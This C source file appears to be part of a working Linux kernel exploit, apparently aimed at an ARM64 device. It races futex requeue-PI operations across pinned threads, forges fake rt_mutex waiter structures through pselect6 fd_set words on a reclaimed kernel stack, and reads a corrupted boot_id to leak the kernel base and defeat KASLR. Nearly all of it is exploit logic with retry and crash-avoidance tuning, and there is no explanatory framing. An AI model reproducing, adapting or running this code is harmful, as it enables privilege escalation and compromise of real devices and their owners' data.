#include "common.h"

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_WAIT_SECONDS 30
#define SLIDE_SHIFT_MIN 0
#define SLIDE_SHIFT_MAX 16

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static int slide_runtime_shift = PSELECT_WAITER_WORD_SHIFT;

static void slide_flush_logs(void) {
  fflush(stdout);
  fflush(stderr);
}

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name) {
  int global_word = shift + waiter_word;
  int input_words = 3 * words_per_set;
  if (global_word >= input_words && global_word < 2 * input_words) {
    global_word -= input_words;
  }
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  int shift = slide_runtime_shift;
  struct slide_waiter_word {
    int word;
    int shift;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, shift, SLIDE_LOGGERS_0_1, "tree_pc"},
    {1, shift, 0, "tree_right"},
    {2, shift, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {3, shift, FAKE_WAITER_PRIO, "tree_prio"},
    {4, shift, 0, "tree_deadline"},
    {5, shift, SLIDE_LOGGERS_0_1, "pi_parent"},
    {6, shift, 0, "pi_right"},
    {7, shift, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
    {8, shift, FAKE_WAITER_PRIO, "pi_prio"},
    {9, shift, 0, "pi_deadline"},
    {10, shift, SLIDE_INIT_TASK, "task"},
    {11, shift, fake_lock, "lock"},
    {12, shift, 3, "wake_state"},
    {13, shift, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->shift, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  int installed = 0;
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      if (dup2(read_fd, fd) >= 0) {
        installed++;
      }
    }
  }
  if (dup2(read_fd, SLIDE_PSELECT_NFDS - 1) >= 0) {
    installed++;
  }
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
  pr_info("slide pselect fd install done count=%d read_fd=%d\n",
          installed, read_fd);
  slide_flush_logs();
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  fd_set expected_in = in;
  fd_set expected_out = out;
  fd_set expected_ex = ex;
  int use_results = pselect_stack_uses_result_sets(slide_runtime_shift, 13);
  int pipefd[2] = {-1, -1};
  int block_fd = -1;
  int high_read = -1;
  int ready_fd = -1;
  int peer_fd = -1;

  if (use_results) {
    if (!open_ready_selected_fds(
            &in, &out, &ex, &ready_fd, &peer_fd)) {
      pr_error("slide pselect ready-fd setup failed errno=%d\n", errno);
      return;
    }
  } else {
    SYSCHK(pipe(pipefd));
    block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
    if (high_read < 0) {
      pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      return;
    }
  }

  pr_info("slide pselect setup shift=%d page=%016zx fake_lock=%016zx "
          "fake_w0=%016zx fake_task=%016zx loggers=%016zx bootid=%016zx "
          "result_mode=%d\n",
          slide_runtime_shift, page_base, fake_lock, fake_w0, fake_task,
          (uintptr_t)SLIDE_LOGGERS_0_1, (uintptr_t)SLIDE_RANDOM_BOOT_ID_DATA,
          use_results);
  slide_flush_logs();
  pr_info("slide pselect before fd install nfds=%d\n", SLIDE_PSELECT_NFDS);
  slide_flush_logs();
  if (!use_results) {
    open_slide_selected_fds(&in, &out, &ex, high_read);
  }
  pr_info("slide pselect after fd install\n");
  slide_flush_logs();

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = use_results ? 0 : PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  /*
   * Ready descriptors make result mode return immediately without a timeout.
   * A non-NULL timeout makes the syscall wrapper call deeper time-copy helpers
   * after core_sys_select returns, clobbering the reclaimed waiter frame.
   */
  struct timespec *timeoutp = use_results ? NULL : &timeout;

  if (!use_results) {
    atomic_store(&slide_consume_go, 1);
  }
  pr_info("slide pselect before syscall\n");
  slide_flush_logs();
  errno = 0;

  int ret = (int)syscall(
      SYS_pselect6, SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  int sets_match = !use_results || pselect_fdsets_match(
      &expected_in, &expected_out, &expected_ex, &in, &out, &ex);
  if (use_results && ret >= 0 && sets_match) {
    atomic_store(&slide_consume_go, 1);
    while (!atomic_load(&slide_consume_stop)) {
      __asm__ volatile("yield" ::: "memory");
    }
  }
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d result_mode=%d "
          "sets_match=%d calls=%d sched_ok=%d last_sched_ret=%d "
          "last_sched_errno=%d\n",
          ret, saved_errno, use_results, sets_match,
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  slide_flush_logs();

  if (high_read >= 0) {
    close(high_read);
  }
  if (block_fd >= 0 && block_fd != pipefd[0]) {
    close(block_fd);
  }
  if (pipefd[0] >= 0) {
    close(pipefd[0]);
  }
  if (pipefd[1] >= 0) {
    close(pipefd[1]);
  }
  if (ready_fd >= 0) {
    close(ready_fd);
  }
  if (peer_fd >= 0) {
    close(peer_fd);
  }
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* Prefer the big core used by the rest of the chain when available. */
  if (direct_root_cpu >= 0) {
    pin_to_core((size_t)((direct_root_cpu > 0) ? (direct_root_cpu - 1) : 0));
  } else {
    pin_to_core(CONSUMER_CORE);
  }

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    for (unsigned long spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1 &&
        !pselect_stack_uses_result_sets(slide_runtime_shift, 13)) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    pr_info("slide consumer before tgkill tid=%d calls=%d\n", tid, calls);
    errno = 0;
    long alive_ret = syscall(SYS_tgkill, getpid(), tid, 0);
    int alive_errno = errno;
    pr_info("slide consumer before sched tid=%d alive_ret=%ld "
            "alive_errno=%d\n",
            tid, alive_ret, alive_errno);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    pr_info("slide consumer sched tid=%d alive_ret=%ld alive_errno=%d "
            "sched_ret=%ld sched_errno=%d\n",
            tid, alive_ret, alive_errno, ret, saved_errno);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (direct_root_cpu >= 0) {
    pin_to_core((size_t)direct_root_cpu);
  } else {
    pin_to_core(CORE);
  }
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (direct_root_cpu >= 0) {
    pin_to_core((size_t)direct_root_cpu);
  } else {
    pin_to_core(CORE);
  }
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx boot_id_raw=%02x%02x%02x%02x"
               "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",
               (unsigned long long)leaked,
               raw[0], raw[1], raw[2], raw[3], raw[4], raw[5], raw[6], raw[7],
               raw[8], raw[9], raw[10], raw[11], raw[12], raw[13], raw[14],
               raw[15]);
    slide_flush_logs();
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  slide_flush_logs();
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  slide_f_wait = 0;
  slide_f_pi_target = 0;
  slide_f_pi_chain = 0;
  atomic_store(&slide_waiter_ready, 0);
  atomic_store(&slide_waiter_waiting, 0);
  atomic_store(&slide_owner_started, 0);
  atomic_store(&slide_route_done, 0);
  atomic_store(&slide_waiter_tid, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  long rq = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                     &slide_f_pi_target, 0);
  pr_info("slide requeue ret=%ld errno=%d waiter_tid=%d\n",
          rq, errno, atomic_load(&slide_waiter_tid));
  slide_flush_logs();

  int waited = 0;
  while (!atomic_load(&slide_route_done) && waited < SLIDE_WAIT_SECONDS + 5) {
    sleep(1);
    waited++;
  }
  if (!atomic_load(&slide_route_done)) {
    pr_warning("slide route timeout after %ds shift=%d\n",
               waited, slide_runtime_shift);
    slide_flush_logs();
    return 0;
  }

  /* Give the corrupted boot_id path a moment to settle before reading. */
  usleep(200000);
  uint64_t stext = slide_read_stext();
  pr_info("slide child finished shift=%d stext=%016llx route_done=1\n",
          slide_runtime_shift, (unsigned long long)stext);
  slide_flush_logs();
  return stext;
}

int slide_leak_kernel_base(void) {
  /*
   * This device already proved shift=2 works. Prefer it heavily before
   * exploring neighbors — wrong shifts are more likely to panic.
   */
  int shifts[] = {
    PSELECT_WAITER_WORD_SHIFT,
    PSELECT_WAITER_WORD_SHIFT,
    PSELECT_WAITER_WORD_SHIFT,
    PSELECT_WAITER_WORD_SHIFT - 1,
    PSELECT_WAITER_WORD_SHIFT + 1,
    PSELECT_WAITER_WORD_SHIFT,
    PSELECT_WAITER_WORD_SHIFT - 2,
    PSELECT_WAITER_WORD_SHIFT + 2,
  };
  int shift_count = (int)(sizeof(shifts) / sizeof(shifts[0]));
  for (int i = 0; i < shift_count; i++) {
    if (shifts[i] < SLIDE_SHIFT_MIN) {
      shifts[i] = SLIDE_SHIFT_MIN;
    }
    if (shifts[i] > SLIDE_SHIFT_MAX) {
      shifts[i] = SLIDE_SHIFT_MAX;
    }
  }

  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    int shift = shifts[(attempt - 1) % shift_count];
    slide_runtime_shift = shift;

    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      pr_warning("slide attempt %d page setup failed shift=%d\n",
                 attempt, shift);
      slide_flush_logs();
      continue;
    }

    pr_info("slide attempt %d uses pselect shift=%d page=%016zx\n",
            attempt, shift, page_base);
    slide_flush_logs();

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      if (direct_root_cpu >= 0) {
        pin_to_core((size_t)direct_root_cpu);
      } else {
        pin_to_core(CORE);
      }
      log_slide_child_context();
      slide_flush_logs();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        slide_flush_logs();
        _exit(0);
      }
      slide_flush_logs();
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d shift=%d "
                 "exited=%d exitcode=%d signaled=%d sig=%d\n",
                 attempt, n, status, shift,
                 WIFEXITED(status),
                 WIFEXITED(status) ? WEXITSTATUS(status) : -1,
                 WIFSIGNALED(status),
                 WIFSIGNALED(status) ? WTERMSIG(status) : 0);
      slide_flush_logs();
      /* Back off after a miss so a half-applied race is less likely to panic. */
      usleep(500000);
      cleanup_page_prepare_state();
      close_reclaim_sockets();
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, shift);
    slide_flush_logs();
    return 1;
  }

  return 0;
}
